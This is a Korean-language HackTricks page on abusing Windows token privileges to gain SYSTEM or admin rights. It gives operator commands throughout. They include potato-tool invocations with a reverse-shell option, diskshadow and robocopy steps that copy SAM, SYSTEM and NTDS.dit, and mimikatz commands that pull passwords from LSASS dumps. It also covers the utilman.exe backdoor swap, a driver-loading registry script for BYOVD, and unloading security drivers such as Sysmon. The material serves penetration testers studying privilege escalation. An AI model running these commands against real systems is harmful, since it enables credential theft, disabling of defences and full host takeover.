# Tokens 악용

{{#include ../../banners/hacktricks-training.md}}

## 토큰

**Windows Access Tokens**가 무엇인지 모른다면 계속하기 전에 이 페이지를 읽으세요:


{{#ref}}
access-tokens.md
{{#endref}}

**이미 보유한 토큰을 악용해 권한을 상승시킬 수 있습니다.**

### SeImpersonatePrivilege

이 권한을 사용하면 프로세스가 토큰에 대한 핸들을 얻었을 때 해당 토큰을 가장할 수 있습니다(토큰을 생성할 수는 없음). 취약점을 악용해 NTLM 인증을 수행하도록 유도하면 Windows 서비스(DCOM)에서 권한이 높은 토큰을 획득할 수 있으며, 이를 통해 SYSTEM 권한으로 프로세스를 실행할 수 있습니다.<sup>[[2]](#references)</sup> [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM)(WinRM이 비활성화되어 있어야 함), [SweetPotato](https://github.com/CCob/SweetPotato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) 등의 도구로 이 기법을 악용할 수 있습니다.

로컬 사용자가 인증된 엔드포인트에 접근할 수 있고, 해당 엔드포인트가 더 높은 권한의 ID로 호출자가 지정한 URL에 요청을 보내는 경우, 루프백 전용 웹 애플리케이션도 별도의 강제 인증 유도 가능성으로 검토할 수 있습니다. 엔드포인트의 권한 부여 및 URL 제한, 실제 아웃바운드 클라이언트의 ID와 인증 동작, 그리고 해당 클라이언트가 낮은 권한의 사용자가 제어하는 리스너에 연결할 수 있는지 확인하세요. `SeImpersonatePrivilege`가 활성화되어 있거나, IIS 리스너가 있거나, URL-fetch 매개변수가 있다는 사실만으로 권한이 높은 토큰이나 권한 상승 경로가 입증되는 것은 아닙니다. 이 검토는 수동적으로 수행하세요. 열거 중에 강제 인증 요청을 보내지 마세요. Microsoft의 [client impersonation](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) 및 [IIS application-pool identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) 문서를 참조하세요.

최신 operator 참고 사항:

- **JuicyPotato는 구식입니다**: Windows 10 1809+/Server 2019+에서는 계속 접근 가능한 RPC/COM 인터페이스에 따라 **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** 또는 **PrintSpoofer**를 우선 사용하세요.
- **`LOCAL SERVICE`** 또는 **`NETWORK SERVICE`**로 실행되는 서비스를 침해했고 `whoami /priv`에 `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`가 없는 **필터링된 토큰**이 표시된다면, 먼저 해당 계정의 **기본 권한 집합**을 복구한 다음(예: **FullPowers** 사용) potato 계열 도구를 다시 시도하세요.<sup>[[3]](#references)</sup>
- 최신 포크 중 일부는 원본 도구보다 operator가 사용하기 편합니다. 예를 들어 **SigmaPotato**는 reflection/in-memory 실행과 최신 Windows 호환성을 지원하고, **PrintNotifyPotato**는 PrintNotify COM 서비스를 악용하므로 기존 Spooler 경로가 비활성화된 경우 유용할 수 있습니다.

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

**SeImpersonatePrivilege**와 매우 유사하며, **같은 방법**으로 권한이 높은 token을 가져옵니다.\
그런 다음 이 privilege를 사용하면 새 프로세스 또는 일시 중단된 프로세스에 **primary token을 할당**할 수 있습니다. 권한이 높은 impersonation token이 있으면 primary token을 파생할 수 있습니다 (DuplicateTokenEx).\
이 token으로 'CreateProcessAsUser'를 사용해 **새 프로세스**를 만들거나, 프로세스를 일시 중단된 상태로 만든 뒤 **token을 설정**할 수 있습니다 (일반적으로 실행 중인 프로세스의 primary token은 수정할 수 없습니다).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

이 token을 활성화하면 **KERB_S4U_LOGON**을 사용해 자격 증명을 몰라도 다른 사용자의 **impersonation token**을 가져오고, token에 임의의 그룹 (admins)을 **추가**하고, token의 **integrity level**을 "**medium**"으로 설정한 뒤, 이 token을 **현재 스레드**에 할당할 수 있습니다 (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

이 privilege로 인해 시스템은 모든 파일에 대해 **모든 읽기 권한**을 부여합니다 (읽기 작업으로 제한됨). 이 privilege는 레지스트리에서 로컬 Administrator 계정의 **password hash를 읽는** 데 사용되며, 이후 hash를 사용해 "**psexec**" 또는 "**wmiexec**" 같은 도구를 사용할 수 있습니다 (Pass-the-Hash 기법). 단, 다음 두 가지 경우에는 이 기법이 실패합니다. Local Administrator 계정이 비활성화된 경우, 또는 원격으로 연결하는 Local Administrator의 관리 권한을 제거하는 policy가 적용된 경우입니다.<sup>[[2]](#references)</sup>\
실제로 가장 신뢰할 수 있는 기본 제공 방식은 보통 **VSS + `robocopy /b`**입니다. shadow copy를 만들거나 노출한 다음, **backup mode**에서 `SAM`/`SYSTEM` 또는 `NTDS.dit`을 복사하면 파일 ACL을 우회할 수 있습니다.<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

이 **권한을 악용**하는 방법은 다음과 같습니다.

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)에서 **IppSec**의 설명을 따라하기
- 또는 다음 문서의 **Backup Operators를 이용한 권한 상승** 섹션에서 설명한 방법을 참고하세요.


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

이 권한은 파일의 Access Control List (ACL)와 관계없이 모든 시스템 파일에 **쓰기 권한**을 부여합니다. 이 권한을 이용하면 **서비스 수정**, DLL Hijacking, Image File Execution Options를 통한 **디버거 설정** 등 다양한 기법으로 권한을 상승시킬 수 있습니다.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege는 강력한 권한입니다. 사용자가 토큰을 가장할 수 있는 경우 특히 유용하지만, SeImpersonatePrivilege가 없어도 활용할 수 있습니다. 이 기능을 사용하려면 현재 프로세스와 동일한 사용자를 나타내고 현재 프로세스보다 높은 무결성 수준을 갖지 않는 토큰을 가장할 수 있어야 합니다.<sup>[[2]](#references)</sup>

**핵심 사항:**

- **SeImpersonatePrivilege 없이 가장:** 특정 조건에서 SeCreateTokenPrivilege를 이용해 토큰을 가장하여 EoP를 수행할 수 있습니다.
- **토큰 가장 조건:** 가장에 성공하려면 대상 토큰이 동일한 사용자에 속하고, 가장을 시도하는 프로세스와 같거나 낮은 무결성 수준을 가져야 합니다.
- **가장 토큰 생성 및 수정:** 사용자는 가장 토큰을 생성하고, 권한이 있는 그룹의 SID (Security Identifier)를 추가해 권한을 강화할 수 있습니다.

### SeLoadDriverPrivilege

이 권한을 사용하면 특정한 `ImagePath` 및 `Type` 값을 가진 레지스트리 항목을 생성하여 프로세스가 **디바이스 드라이버를 로드하거나 언로드**할 수 있습니다. `HKLM` (HKEY_LOCAL_MACHINE)에 직접 쓰는 것이 제한되어 있으므로 대신 `HKCU` (HKEY_CURRENT_USER)를 사용할 수 있습니다. 하지만 커널이 `HKCU` 항목을 드라이버 구성으로 인식하려면 특정 경로가 필요합니다.<sup>[[2]](#references)</sup>

현재의 공격적 활용 방식은 보통 **BYOVD** (bring your own vulnerable driver)입니다. 즉, **서명되었지만 취약한** 커널 드라이버를 로드한 다음 해당 드라이버의 IOCTL을 사용해 보호 기능을 비활성화하거나 커널 코드 실행으로 이어지는 것입니다. 최신 Windows 11/Server 빌드에서는 **Microsoft 취약 드라이버 차단 목록** 및/또는 **HVCI/Memory Integrity**로 인해 오래된 공개 체인이 작동하지 않는 경우가 많습니다. 따라서 `szkg64.sys`와 같은 고전적인 예제가 더 이상 어디서나 안정적으로 동작하는 것은 아닙니다.

경로는 `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`이며, 여기서 `<RID>`는 현재 사용자의 Relative Identifier입니다. `HKCU` 내에 이 전체 경로를 생성하고 두 개의 값을 설정해야 합니다.<sup>[[2]](#references)</sup>

- 실행할 바이너리의 경로인 `ImagePath`
- `SERVICE_KERNEL_DRIVER` (`0x00000001`) 값으로 설정하는 `Type`

**수행 단계:**

1. 쓰기 권한이 제한되어 있으므로 `HKLM` 대신 `HKCU`에 접근합니다.
2. 현재 사용자의 Relative Identifier를 나타내는 `<RID>`를 사용하여 `HKCU` 내에 `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` 경로를 생성합니다.
3. `ImagePath`를 바이너리의 실행 경로로 설정합니다.
4. `Type`을 `SERVICE_KERNEL_DRIVER` (`0x00000001`)로 설정합니다.

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

이 권한을 악용하는 더 많은 방법은 [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)에서 확인할 수 있습니다.

### SeTakeOwnershipPrivilege

이 권한은 **SeRestorePrivilege**와 유사합니다. 주된 기능은 프로세스가 **객체의 소유권을 가져올 수 있도록** 하여, WRITE_OWNER 액세스 권한을 부여함으로써 명시적인 임의 액세스 권한이 필요한 조건을 우회하는 것입니다. 이 과정에서는 먼저 쓰려는 레지스트리 키의 소유권을 확보한 다음, 쓰기 작업을 허용하도록 DACL을 변경합니다.<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

이 권한을 사용하면 **다른 프로세스를 디버그**할 수 있으며, 메모리를 읽고 쓸 수도 있습니다. 대부분의 antivirus 및 host intrusion prevention 솔루션을 우회할 수 있는 다양한 memory injection 전략을 이 권한으로 사용할 수 있습니다.<sup>[[2]](#references)</sup>

최신 Windows에서는 `SeDebugPrivilege`만으로도 대개 **보호되지 않는 SYSTEM 프로세스**를 열고 해당 프로세스의 token을 복제할 수 있지만, **LSASS**에 접근할 수 있다는 보장은 없다는 점을 기억하세요. **RunAsPPL / LSA Protection**이 활성화되어 있으면 `SeDebugPrivilege`가 있더라도 보호되지 않는 프로세스는 LSASS를 읽거나 여기에 코드를 주입할 수 없습니다. 이 경우 다른 비 PPL SYSTEM 프로세스에서 token을 탈취하거나, `procdump`가 작동할 것이라고 가정하는 대신 PPL bypass/BYOVD와 연계하세요. `SeDebugPrivilege`와 `SeImpersonatePrivilege`를 사용하는 전체 token 복사 예시는 [이 페이지](sedebug-+-seimpersonate-copy-token.md)를 확인하세요.

#### 메모리 덤프

[SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)의 [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)를 사용하면 **프로세스의 메모리를 캡처**할 수 있습니다. 특히 시스템에 성공적으로 로그인한 사용자의 자격 증명을 저장하는 **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** 프로세스에 사용할 수 있습니다.

그런 다음 이 덤프를 mimikatz에 로드하여 비밀번호를 얻을 수 있습니다:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

이전에 저장된 읽을 수 있는 LSASS dump가 현재 계정에 실행 중인 보호 프로세스를 캡처할 권한이 없더라도 존재할 수 있습니다. dump 파일이나 이름이 비슷한 아카이브는 단서로만 취급하세요. 접근 가능 여부와 내용을 확인한 다음, 복구된 credential이 여전히 유효하며 더 높은 권한의 컨텍스트를 제공하는지 평가하세요. 파일 이름만으로 아카이브에 dump가 들어 있거나 credential을 재사용할 수 있다고 단정할 수는 없습니다.

#### RCE

`NT SYSTEM` shell을 얻으려면 다음을 사용할 수 있습니다.

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

이 권한(볼륨 유지 관리 작업 수행)은 권한이 필요한 볼륨 작업을 지원할 수 있지만, 그 자체만으로 읽기 가능한 raw-volume 핸들이나 임의 파일 접근을 보장하지는 않습니다. 장치 ACL, 토큰 상태, Windows 버전, 요청된 작업도 여전히 영향을 미칩니다. 허용된 볼륨 제어 작업은 대신 파일 시스템 ACL을 변경할 수 있으며, 이는 볼륨 전체에 영향을 줄 수 있는 변경 작업입니다. CA 호스트에서 인증서를 악용하려면 사용 가능한 개인 키 자료에도 접근할 수 있어야 하며, EFS로 보호된 파일에는 여전히 권한이 있는 복호화 키 또는 복구 키가 필요합니다. 자세한 사전 요건은 아래를 참조하세요.<sup>[[5]](#references)</sup>

자세한 기술 및 완화 방법을 참조하세요:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## 권한 확인

```
whoami /priv
```

**Disabled**로 표시된 토큰은 보통 활성화할 수 있으므로, _Enabled_ 및 _Disabled_ 권한을 모두 악용할 수 있는 경우가 많습니다.

### 모든 토큰 활성화

비활성화된 권한이 있으면 [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) 스크립트를 사용해 모든 토큰을 활성화할 수 있습니다:

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

또는 이 [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/)에 포함된 **script**를 사용할 수도 있습니다.

## Table

전체 token privileges cheatsheet는 [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)에서 확인할 수 있습니다. 아래 요약에는 해당 privilege를 악용해 admin 세션을 얻거나 민감한 파일을 읽는 직접적인 방법만 나와 있습니다.<sup>[[1]](#references)</sup>

| Privilege                  | 영향      | 도구                    | 실행 경로                                                                                                                                                                                                                                                                                                                                     | 비고                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"사용자가 token을 가장하고 potato.exe, rottenpotato.exe, juicypotato.exe 같은 도구를 사용해 nt system으로 privesc할 수 있게 합니다"_                                                                                                                                                                                                      | 업데이트를 알려주신 [Aurélien Chalot](https://twitter.com/Defte_)께 감사드립니다. 조만간 좀 더 레시피처럼 이해하기 쉽게 다시 작성해 보겠습니다.                                                                                                                                                                                         |
| **`SeBackup`**             | **위협**  | _**내장 명령**_ | `robocopy /b` 또는 SeBackup을 지원하는 전용 복사 helper로 민감한 파일을 읽습니다.                                                                                                                                                                                                                                                                 | <p>- `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, 경우에 따라 `%WINDIR%\MEMORY.DMP`를 가져오는 데 유용합니다.<br><br>- `robocopy`가 편리하지만, 잠겨 있거나 열려 있는 파일에는 전용 SeBackup cmdlet/API가 더 유연한 경우가 많습니다.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | `NtCreateToken`을 사용해 로컬 admin 권한을 포함한 임의의 token을 생성합니다.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | **PPL이 아닌** SYSTEM token을 복제하거나 보호되지 않은 프로세스의 메모리를 덤프합니다.                                                                                                                                                                                                                                                                 | <p>RunAsPPL/LSA Protection이 활성화되어 있으면 LSASS 덤프가 흔히 차단됩니다.</p><p>Script는 [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)에서 확인할 수 있습니다.</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | **Potato 계열** / named-pipe 가장을 사용해 SYSTEM을 실행합니다(`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` 등).                                                                                                                                                                                    | <p>`SeImpersonatePrivilege`를 이미 보유한 IIS APPPOOL, MSSQL, scheduled task 등의 service account나 기타 context에서 가장 실용적입니다.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. 서명되었지만 취약한 kernel driver(BYOVD)를 로드합니다.<br>2. driver의 IOCTL을 사용해 kernel R/W를 얻고, 보안 도구를 비활성화하거나 SYSTEM으로 권한을 상승시킵니다.<br><br>또는 이 privilege로 내장 명령 <code>fltMC</code>를 사용해 보안 관련 driver를 언로드할 수 있습니다. 예: <code>fltMC sysmondrv</code></p>                     | <p><code>szkg64.sys</code> 같은 오래된 공개 driver는 취약 driver 차단 목록 / HVCI로 인해 최신 Windows에서 점점 더 많이 차단됩니다.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. SeRestore privilege가 있는 상태에서 PowerShell/ISE를 실행합니다.<br>2. <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>)로 privilege를 활성화합니다.<br>3. utilman.exe를 utilman.old로 이름을 변경합니다.<br>4. cmd.exe를 utilman.exe로 이름을 변경합니다.<br>5. 콘솔을 잠그고 Win+U를 누릅니다.</p> | <p>일부 AV software에서 공격을 탐지할 수 있습니다.</p><p>다른 방법으로는 같은 privilege를 사용해 "Program Files"에 저장된 service binary를 교체할 수 있습니다.</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**내장 명령**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. cmd.exe의 이름을 utilman.exe로 변경합니다.<br>4. 콘솔을 잠그고 Win+U를 누릅니다.</p>                                                                                                                                       | <p>일부 AV software에서 공격을 탐지할 수 있습니다.</p><p>다른 방법으로는 같은 privilege를 사용해 "Program Files"에 저장된 service binary를 교체할 수 있습니다.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>로컬 admin 권한을 포함하도록 token을 조작합니다. SeImpersonate가 필요할 수 있습니다.</p><p>확인 필요.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - Windows privilege에서 admin으로 이어지는 exploit 경로](https://github.com/gtworek/Priv2Admin)
- [2] [LPE를 위한 Token Privilege 악용](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – 내 privilege를 돌려주세요! 부탁입니다](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` 백업 모드는 파일/폴더 ACL 검사를 우회)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – 볼륨 유지 관리 작업 수행(SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key 유출 → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
